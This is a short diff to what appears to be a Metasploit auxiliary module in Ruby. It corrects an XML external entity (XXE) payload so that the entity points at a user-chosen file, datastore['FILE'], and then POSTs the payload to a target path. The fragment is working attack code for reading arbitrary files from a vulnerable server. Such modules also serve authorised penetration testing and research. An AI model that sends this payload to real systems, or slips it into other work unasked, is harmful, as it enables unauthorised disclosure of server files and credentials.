@@ -35,7 +35,7 @@ class MetasploitModule < Msf::Auxiliary
     payload_post =  "<xml version='1.0' encoding='ISO-8859-1' ?>"
     payload_post << "<!DOCTYPE foo ["
     payload_post << "<!ELEMENT foo ANY >"
-    payload_post << "<!ENTITY xxe SYSTEM '#{datastore}' >]><foo>&xxe;</foo>"
+    payload_post << "<!ENTITY xxe SYSTEM '#{datastore['FILE']}' >]><foo>&xxe;</foo>"
     res = send_request_cgi({
         'uri'     => path_uri,
         'method'  => 'POST',
